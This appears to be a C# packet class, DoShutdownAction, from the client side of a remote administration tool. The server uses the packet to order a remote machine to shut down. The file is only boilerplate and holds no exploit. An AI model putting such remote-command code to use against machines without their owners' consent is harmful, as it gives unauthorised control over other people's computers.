using System;
using xClient.Core.Networking;
using xClient.Enums;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoShutdownAction : IPacket
    {
        public ShutdownAction Action { get; set; }

        public DoShutdownAction()
        {
        }

        public DoShutdownAction(ShutdownAction action)
        {
            this.Action = action;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}